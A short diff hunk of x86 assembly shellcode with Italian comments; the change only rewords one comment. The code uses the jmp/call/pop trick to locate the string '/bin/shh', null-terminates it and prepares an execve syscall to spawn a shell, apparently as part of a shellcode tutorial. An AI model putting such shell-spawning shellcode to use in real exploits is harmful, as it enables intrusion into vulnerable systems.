@@ -21,7 +21,7 @@ _start:
 		jmp stromboli
 
 topolino:
-		pop ebx              ;ora ebx contiene un puntatore alla stringa '/bin/shh'
+		pop ebx              ;ora ebx contiene l'indirizzo della stringa '/bin/shh'
 		mov [ebx + 7], cl    ;sostituiamo l'h finale di '/bin/shh' con un carattere 0x0
 		mov al, 0xb          ;codice della execve
 
